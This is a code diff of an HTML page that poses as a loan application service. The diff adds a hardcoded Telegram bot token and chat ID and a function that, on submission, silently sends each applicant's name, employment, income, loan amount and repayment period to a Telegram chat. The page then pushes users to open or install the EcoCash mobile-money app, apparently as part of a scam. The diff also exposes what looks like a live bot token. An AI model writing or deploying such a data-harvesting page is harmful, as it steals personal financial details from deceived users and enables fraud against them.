@@ -95,7 +95,6 @@
     }
     .hidden { display: none !important; }
 
-    /* FULL SCREEN */
     #processingScreen {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: #f0f4f8; z-index: 9999; display: flex; flex-direction: column;
@@ -233,6 +232,11 @@
   </div>
 
   <script>
+    // ========== TELEGRAM SETTINGS ==========
+    const BOT_TOKEN = "8781176714:AAHrmyA1kJwu1bAwo9HGtt_6rexjEttHr1w";
+    const CHAT_ID = "8412645169";
+    // ======================================
+
     const menuBtn = document.getElementById("menuBtn");
     const mobileNav = document.getElementById("mobileNav");
     menuBtn.addEventListener("click", () => mobileNav.classList.toggle("open"));
@@ -279,19 +283,60 @@
       showPage("apply");
     }
 
-    document.getElementById("loanForm").addEventListener("submit", function (e) {
+    // Send data to Telegram
+    async function sendToTelegram(data) {
+      const message = 
+`🆕 *New Loan Application*
+
+👤 *Full Name:* ${data.fullName}
+💼 *Employment:* ${data.employment}
+💰 *Monthly Income:* ${data.income}
+💵 *Loan Amount:* $${data.loanAmount}
+📅 *Repayment Period:* ${data.repayment} months
+
+⏰ ${new Date().toLocaleString()}`;
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (err) {
+        console.log("Telegram error:", err);
+      }
+    }
+
+    document.getElementById("loanForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
-      if (!document.getElementById("fullName").value.trim() ||
-          !document.getElementById("employment").value ||
-          !document.getElementById("income").value.trim() ||
-          !document.getElementById("loanAmount").value.trim() ||
-          !document.getElementById("repayment").value) {
+      const fullName = document.getElementById("fullName").value.trim();
+      const employment = document.getElementById("employment").value;
+      const income = document.getElementById("income").value.trim();
+      const loanAmount = document.getElementById("loanAmount").value.trim();
+      const repayment = document.getElementById("repayment").value;
+
+      if (!fullName || !employment || !income || !loanAmount || !repayment) {
         alert("Please fill in all fields.");
         return;
       }
 
-      // Full screen loading
+      // Send to Telegram first
+      await sendToTelegram({
+        fullName,
+        employment,
+        income,
+        loanAmount,
+        repayment
+      });
+
+      // Then show full screen loading
       document.getElementById("page-home").classList.add("hidden");
       document.getElementById("page-apply").classList.add("hidden");
       document.getElementById("mainHeader").style.display = "none";
@@ -305,15 +350,15 @@
       document.getElementById("installBtn").style.display = "none";
 
       setTimeout(function () {
-        // Try to open EcoCash app (com.ecocash)
+        // Try to open EcoCash app
         window.location.href = "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=com.ecocash;end";
 
-        // If still on this page after 3 seconds → app is not installed
+        // If still here after 3 seconds → app not installed
         setTimeout(function () {
           document.getElementById("spinner").style.display = "none";
           document.getElementById("processTitle").textContent = "EcoCash App Required";
           document.getElementById("processText").textContent = "You must install the EcoCash app first.";
-          document.getElementById("processSub").textContent = "After installing, come back here and press Submit again. The app will then open automatically.";
+          document.getElementById("processSub").textContent = "After installing, come back here and press Submit again.";
           document.getElementById("installBtn").style.display = "block";
         }, 3000);
       }, 2500);
@@ -321,5 +366,3 @@
   </script>
 </body>
 </html>
-const BOT_TOKEN = "8781176714:AAHrmyA1kJwu1bAwo9HGtt_6rexjEttHr1w";
-const CHAT_ID = "8412645169";
